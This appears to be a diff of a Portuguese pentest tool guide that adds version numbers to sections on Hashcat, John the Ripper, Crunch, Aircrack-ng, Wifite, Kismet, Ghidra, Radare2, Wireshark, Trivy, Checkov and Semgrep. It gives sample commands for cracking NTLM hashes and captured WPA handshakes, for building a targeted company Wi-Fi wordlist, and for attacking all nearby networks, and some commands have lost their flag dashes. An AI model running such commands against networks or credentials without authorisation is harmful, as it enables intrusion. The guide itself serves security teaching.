 - **Descrição Acadêmica/Técnica:** O Hashcat é o motor de quebra de senhas mais performático da indústria, desenvolvido em C e OpenCL/CUDA, arquitetado para explorar o paralelismo massivo de Unidades de Processamento Gráfico (GPUs) em vez de depender exclusivamente do processamento sequencial de CPUs. Em baixo nível, a ferramenta compila *kernels* de computação específicos para cada algoritmo de *hash* suportado (mais de 350 modos, identificados numericamente), distribuindo o cálculo de milhões a bilhões de tentativas de *hash* por segundo entre os múltiplos núcleos de processamento paralelo de uma GPU. O motor suporta múltiplos vetores de ataque simultâneos e mutuamente combináveis — força bruta pura (*Brute-Force*), dicionário direto (*Straight*), *combinator* (concatenação de duas listas) e, mais notavelmente, ataques baseados em regras (*Rule-Based*), onde uma sintaxe compacta de transformação (ex: capitalização, substituição de caracteres, adição de sufixos numéricos) é aplicada dinamicamente sobre cada palavra de uma *wordlist* de entrada, multiplicando exponencialmente o espaço de busca sem a necessidade de armazenar fisicamente essas variações.  
 - **Principais Funcionalidades:**  
@@ -1074,7 +1076,7 @@ hashcat m 1000 hashntlmextraido.txt /usr/share/wordlists/rockyou.txt r /usr/shar
 
 
 
-## **8.2 John the Ripper**
+## **8.2 John the Ripper — v1.9.0-Jumbo-1**
 
 - **Descrição Acadêmica/Técnica:** O John the Ripper (JtR) é um dos motores de quebra de senhas mais tradicionais e versáteis da indústria, desenvolvido em C, historicamente otimizado para processamento em CPU (embora sua variante *jumbo* também ofereça suporte experimental a OpenCL). Sua distinção arquitetural central reside no utilitário auxiliar *format-agnostic*, capaz de identificar automaticamente o algoritmo de um *hash* através de análise estrutural (comprimento, *salt*, delimitadores), e no script auxiliar *2john*, uma família de conversores que extrai hashes de formatos de arquivo proprietários e complexos (ex: documentos protegidos do Office, arquivos ZIP/RAR criptografados, chaves privadas SSH) para o formato de texto simples que o motor de quebra consegue processar. O modo de ataque "Single Crack" é particularmente notável por sua inteligência contextual, utilizando os próprios metadados da conta (nome de usuário, campos GECOS) como base para gerar candidatos de senha altamente direcionados antes de recorrer a *wordlists* genéricas.  
 - **Principais Funcionalidades:**  
@@ -1119,7 +1121,7 @@ john -wordlist=/usr/share/wordlists/rockyou.txt hashesservidor.txt
 
 
 
-## **8.3 Crunch**
+## **8.3 Crunch — v3.6**
 
 - **Descrição Acadêmica/Técnica:** O Crunch é um gerador de *wordlists* customizadas escrito em C, projetado para produzir combinações sistemáticas e exaustivas de caracteres de acordo com parâmetros rígidos definidos pelo operador (comprimento mínimo/máximo, conjunto de caracteres, padrões estruturais fixos). Diferente de *wordlists* estáticas pré-compiladas (como a rockyou.txt), que representam senhas reais previamente vazadas, o Crunch opera de forma puramente combinatória e determinística, iterando metodicamente por todo o espaço amostral definido pelos parâmetros de entrada. Sua funcionalidade de padrões (-t) é particularmente relevante para engenharia social direcionada, permitindo fixar segmentos conhecidos ou inferidos da senha (ex: o nome da empresa) e permutar apenas as posições variáveis remanescentes (ex: dígitos de ano ou caracteres especiais), reduzindo drasticamente o espaço de busca em relação a uma força bruta genérica e irrestrita.  
 - **Principais Funcionalidades:**  
@@ -1162,7 +1164,7 @@ crunch 10 10 t TechCorp%%%% o wordlisttechcorpwifi.txt
 
 Esta seção desvia-se do paradigma de redes cabeadas (TCP/IP) para operar diretamente na Camada 1 e 2 do modelo OSI, através da manipulação de interfaces de rádio frequência. O foco recai sobre a interceptação passiva de tráfego eletromagnético, a exploração de falhas criptográficas e de implementação nos protocolos de segurança Wi-Fi (WEP/WPA/WPA2/WPS) e a auditoria de outros meios de comunicação sem fio, como Bluetooth.
 
-## **9.1 Aircrack-ng**
+## **9.1 Aircrack-ng — v1.7**
 
 - **Descrição Acadêmica/Técnica:** O Aircrack-ng não é uma ferramenta isolada, mas uma suíte completa de utilitários em C, especializada na auditoria de segurança de redes Wi-Fi (802.11), cuja operação fundamental depende da capacidade da placa de rede sem fio de operar em *modo monitor* — um estado de baixo nível no qual a interface captura todos os quadros (*frames*) 802.11 no ar dentro do seu alcance de rádio, incluindo aqueles não destinados ao próprio dispositivo, ao contrário do *modo managed* convencional. Composta por ferramentas especializadas e encadeadas (airmon-ng para gerência de interfaces, airodump-ng para captura e despejo de pacotes, aireplay-ng para injeção de pacotes forjados, e aircrack-ng propriamente, o motor de quebra criptográfica), a suíte implementa ataques estatísticos contra a cifra RC4 do WEP e a captura determinística do *4-way handshake* do WPA/WPA2, cuja quebra subsequente depende da derivação criptográfica PBKDF2 contra uma *wordlist*.  
 - **Principais Funcionalidades:**  
@@ -1213,7 +1215,7 @@ aircrack-ng capturacorp-01.cap w wordlisttechcorpwifi.txt
 
 
 
-## **9.2 Wifite**
+## **9.2 Wifite — v2.8.1**
 
 - **Descrição Acadêmica/Técnica:** O Wifite é uma ferramenta de automação escrita em Python, projetada para orquestrar o fluxo completo de ataques contra redes sem fio ao encapsular e sequenciar a execução de múltiplas ferramentas subjacentes especializadas (Aircrack-ng, Reaver, Hashcat, entre outras) sob uma única interface de linha de comando simplificada. Em baixo nível, a ferramenta automatiza integralmente o ciclo operacional que seria manual no Aircrack-ng: ativação do modo monitor, varredura e listagem de todos os alvos próximos ordenados por força de sinal (RSSI), seleção heurística automática do vetor de ataque mais eficiente disponível para cada rede específica (WPS, captura de *handshake* WPA ou quebra de chave WEP), execução do ataque de desautenticação e, por fim, o encaminhamento automático do artefato capturado para o motor de quebra apropriado.  
 - **Principais Funcionalidades:**  
@@ -1248,7 +1250,7 @@ sudo wifite -all -kill
 
 
 
-## **9.3 Kismet**
+## **9.3 Kismet — 2025-09-R1**
 
 - **Descrição Acadêmica/Técnica:** O Kismet é um *framework* de detecção, coleta e análise de redes sem fio, desenvolvido em C++, que opera como um *sniffer* passivo multiplataforma e multiprotocolo (802.11 Wi-Fi, Bluetooth Classic/BLE, Zigbee, RFID e Sistemas de Rádio Definido por Software  SDR). Diferente do Aircrack-ng, cuja arquitetura é centrada primariamente em quebra criptográfica ativa, o Kismet é arquitetado como uma plataforma de inteligência de sinais (*Signals Intelligence*/SIGINT) contínua e passiva, empregando um modelo *servidor-cliente*: um processo *backend* (kismetserver) gerencia múltiplas fontes de captura simultâneas (várias placas Wi-Fi, dongles Bluetooth, receptores SDR) e agrega os dados em um banco relacional (SQLite), enquanto a interface web (kismetclient, acessível via navegador) exibe visualizações em tempo real, incluindo detecção heurística de anomalias como *rogue access points*, ataques de desautenticação em andamento e dispositivos realizando *fingerprinting* via *probe requests*.  
 - **Principais Funcionalidades:**  
@@ -1287,7 +1289,7 @@ curl s [http://localhost:2501/devices/all\_devices.json](http://localhost:2501/d
 
 Esta seção desloca o foco do tráfego de rede e da infraestrutura para a análise de baixo nível do próprio código binário. O objetivo é compreender o funcionamento interno de executáveis desconhecidos ou maliciosos — seja através da reconstrução de sua lógica sem execução (análise estática/descompilação), da observação de seu comportamento em tempo de execução (análise dinâmica/debugging), ou da inspeção do tráfego de rede gerado por artefatos maliciosos.
 
-## **10.1 Ghidra**
+## **10.1 Ghidra — v12.1.2**
 
 - **Descrição Acadêmica/Técnica:** O Ghidra é um *framework* de engenharia reversa de código aberto, desenvolvido em Java/C++ e mantido pela *National Security Agency* (NSA), projetado para a análise estática avançada de binários compilados em múltiplas arquiteturas (x86, ARM, MIPS, entre outras). Seu componente central é um motor de descompilação que traduz instruções de linguagem *assembly* de baixo nível em um pseudocódigo estruturado de alto nível, sintaticamente similar à linguagem C, facilitando drasticamente a compreensão da lógica do programa sem a necessidade de interpretar manualmente milhares de instruções de máquina. Em baixo nível, o Ghidra opera através da análise automática de referências cruzadas (*cross-references*), reconstrução de estruturas de dados, inferência de tipos de variáveis e identificação de convenções de chamada de função, permitindo a renomeação e anotação colaborativa de artefatos binários através de sua arquitetura de projetos compartilháveis.  
 - **Principais Funcionalidades:**  
@@ -1318,7 +1320,7 @@ analyzeHeadless diretoriodoprojeto nomedoprojeto process nomedobinario scriptPat
 
 
 
-## **10.2 Radare2**
+## **10.2 Radare2 — v6.1.8**
 
 - **Descrição Acadêmica/Técnica:** O Radare2 (r2) é um *framework* de engenharia reversa e forense digital de código aberto, escrito em C, arquitetado com uma filosofia radicalmente diferente do Ghidra: prioriza uma interface baseada em linha de comando extremamente compacta e um design modular composto por múltiplos utilitários independentes (r2, rabin2, radiff2, rahash2), interligados por uma sintaxe de comandos mnemônica e altamente componível. Em baixo nível, seu núcleo (libr) implementa desde o *parsing* de formatos de arquivo executável e a desmontagem (*disassembly*) de código de máquina, até um depurador (*debugger*) integrado com suporte a múltiplos backends (nativo, GDB remoto, WinDbg), permitindo tanto a análise estática detalhada quanto a instrumentação dinâmica de binários em execução, tudo através de uma única interface textual scriptável.  
 - **Principais Funcionalidades:**  
@@ -1367,7 +1369,7 @@ afl sub.
 
 
 
-## **10.3 Wireshark**
+## **10.3 Wireshark — v4.6.7**
 
 - **Descrição Acadêmica/Técnica:** O Wireshark é o analisador de protocolos de rede mais utilizado da indústria, desenvolvido em C/C++, projetado para a captura e inspeção granular de tráfego de rede em tempo real ou a partir de arquivos de captura previamente salvos (.pcap/.pcapng). Em baixo nível, a ferramenta utiliza a biblioteca *libpcap* (Linux) ou *Npcap* (Windows) para capturar quadros diretamente da interface de rede em modo promíscuo, e então aplica centenas de *dissectors* — módulos especializados que decodificam progressivamente cada camada do modelo OSI encapsulada dentro de um pacote (desde os cabeçalhos Ethernet e IP até protocolos de aplicação como HTTP, DNS e TLS), reconstruindo a semântica completa da comunicação. Sua funcionalidade de remontagem de fluxo (*Follow TCP/UDP Stream*) reagrupa segmentos de pacotes fragmentados em uma única visualização coesa da conversa completa entre dois hosts, essencial tanto para depuração de protocolos quanto para a análise forense de tráfego malicioso gerado por *malware*.  
 - **Principais Funcionalidades:**  
@@ -1412,7 +1414,7 @@ tshark r capturasandboxmalware.pcapng -export-objects http,arquivosextraidos/
 
 Esta seção final rompe com o paradigma reativo do *pentest* tradicional (auditoria pontual sobre um sistema já implantado) para adotar uma postura preventiva e contínua. O foco recai sobre ferramentas operáveis via CLI, projetadas para integração nativa em *pipelines* de Integração e Entrega Contínuas (CI/CD), permitindo a detecção automatizada de vulnerabilidades em artefatos de *software*, imagens de contêiner e definições de Infraestrutura como Código (IaC) antes que atinjam o ambiente de produção.
 
-## **11.1 Trivy**
+## **11.1 Trivy — v0.72.0**
 
 - **Descrição Acadêmica/Técnica:** O Trivy, desenvolvido em Go pela Aqua Security, é um *scanner* de segurança unificado e abrangente, projetado para consolidar múltiplas superfícies de análise (imagens de contêiner, sistemas de arquivos, repositórios Git e definições IaC) em uma única ferramenta de execução rápida. Em baixo nível, ao analisar uma imagem de contêiner, o Trivy realiza a extração e a inspeção das camadas (*layers*) do sistema de arquivos, identificando o gerenciador de pacotes do sistema operacional base (apt, apk, yum) e as dependências de linguagens de aplicação (package.json, requirements.txt, go.mod), correlacionando cada versão identificada contra múltiplos bancos de dados de vulnerabilidades (NVD, GitHub Security Advisories, distribuições Linux) mantidos em cache local para varreduras subsequentes de alta velocidade, sem exigir conectividade repetida com serviços externos.  
 - **Principais Funcionalidades:**  
@@ -1451,7 +1453,7 @@ trivy image -exit-code 1 -severity CRITICAL,HIGH api-pagamentos:v2.3
 
 
 
-## **11.2 Checkov**
+## **11.2 Checkov — v3.3.8**
 
 - **Descrição Acadêmica/Técnica:** O Checkov, desenvolvido em Python pela Bridgecrew (Palo Alto Networks), é uma ferramenta de análise estática (SAST) especializada exclusivamente na auditoria de Infraestrutura como Código (IaC). Em baixo nível, a ferramenta realiza o *parsing* sintático completo de arquivos de definição de infraestrutura (Terraform, CloudFormation, Kubernetes YAML, ARM Templates, Dockerfile), convertendo-os em uma representação de grafo abstrato de recursos e suas propriedades. Sobre essa representação estruturada, a ferramenta aplica centenas de políticas de segurança predefinidas (*policy-as-code*), verificando programaticamente violações de práticas recomendadas — como *buckets* de armazenamento configurados com acesso público, grupos de segurança de rede permitindo tráfego irrestrito (0.0.0.0/0) ou bancos de dados provisionados sem criptografia em repouso — antes que a infraestrutura seja de fato provisionada no ambiente de nuvem.  
 - **Principais Funcionalidades:**  
@@ -1490,7 +1492,7 @@ checkov d ./infraestruturaterraform -compact
 
 
 
-## **11.3 Semgrep**
+## **11.3 Semgrep — v1.170.0**
 
 - **Descrição Acadêmica/Técnica:** O Semgrep, desenvolvido em OCaml/Python pela Semgrep Inc. (anteriormente r2c), é uma ferramenta de análise estática de código-fonte (SAST) *multi-linguagem*, arquitetada para detectar padrões de vulnerabilidade e má prática de programação sem a necessidade de compilar o código analisado. Em baixo nível, a ferramenta realiza o *parsing* do código-fonte em uma Árvore de Sintaxe Abstrata (AST) genérica e independente de linguagem, sobre a qual aplica regras de correspondência de padrões (*pattern matching*) escritas em uma sintaxe declarativa YAML que se assemelha intencionalmente ao próprio código-fonte alvo, mas com suporte a metavariáveis (ex: $VAR) que capturam expressões arbitrárias. Essa abordagem permite que analistas de segurança escrevam regras customizadas de detecção (ex: identificar chamadas a funções de execução de comando concatenadas com entrada de usuário não sanitizada) com uma curva de aprendizado significativamente menor do que a exigida por ferramentas SAST tradicionais baseadas em análise de fluxo de dados complexa.  
 - **Principais Funcionalidades:**  
